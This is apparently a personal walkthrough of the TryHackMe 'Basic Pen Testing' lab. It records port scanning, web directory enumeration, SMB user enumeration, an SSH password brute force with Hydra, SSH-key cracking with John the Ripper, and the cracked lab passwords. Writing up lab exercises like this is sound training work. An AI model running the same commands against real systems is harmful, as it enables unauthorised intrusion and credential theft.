# Matheus Jesus 31-03-2020

## Try Hack Me - Basic Pen Testing (https://tryhackme.com/room/basicpentestingjt)

### IP 10.10.236.222

#### 1. Net Scan

nmap -sC -sV -oN nmap_initial 10.10.73.27

* Open Ports

```text
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
39/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```

##### WEB SERVICE ON http://10.10.73.27

##### Find webservice Routes

dirbuster -r dirbuster_initial.txt -u http://10.10.73.27
with list /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

Found **/development** route

/development/dev.txt

```text
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

/development/j.txt

```text
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

#### 2. SMB Find Users

Try to find username through SMB application layer
enum4linux -a 10.10.73.27 | tee enum4linux.log
Users found

```text
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

#### 3. Brute Force Password

Brute Force Jan's password through SSH Hydra
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.73.27

```text
[22][ssh] host: 10.10.73.27   login: jan   password: armando
```

#### 4. Access Jan User

Login jan user with ssh jan@10.10.73.27

* access /home/kay
* found a pass.bak file

#### 5. Privilege Escalation

Get Privilege Escalation exploits

using linPEAS
Copy script over to the machine
scp /opt/linPEAR/linpeas.sh jan@10.10.73.27:/dev/shm

#### 6. RSA Certificate Cracking

Under /home/kay
there is a hidden folder .ssh
inside there is it's RSA certificate 

use John The Ripper
https://github.com/magnumripper/JohnTheRipper

/run/ssh2john.py RSA > forjohn.txt
/run/john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt

Found password  **beeswax** for user Kay

#### 7. Access Kay User

access kay user
ssh -i kay_rsa kay@10.10.73.27
password beeswax

ls to pass.bak
cat pass.bak

DONE!!!
